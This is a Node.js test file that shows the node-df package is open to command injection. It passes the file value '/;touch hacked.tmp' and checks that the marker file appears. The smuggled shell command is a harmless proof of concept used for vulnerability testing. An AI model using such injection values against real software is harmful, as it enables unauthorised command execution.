const { test } = require("node:test");
const { equal } = require("node:assert");
const { existsSync, rmSync } = require("node:fs");

test("Vulnerable to Command Injection", async () => {
  const df = require("node-df");
  const options = {
    file: "/;touch hacked.tmp",
    prefixMultiplier: "GB",
    isDisplayPrefixMultiplier: true,
    precision: 2,
  };

  // Promisfy
  const result = await new Promise((resolve, reject) => {
    df(options, function (error, response) {
      if (error) {
        reject(error);
        return;
      }

      resolve(response);
    });
  });

  equal(typeof result, "object");

  // Check if the file was created
  equal(existsSync("hacked.tmp"), true);

  // Clean up the created file
  rmSync("hacked.tmp");
});
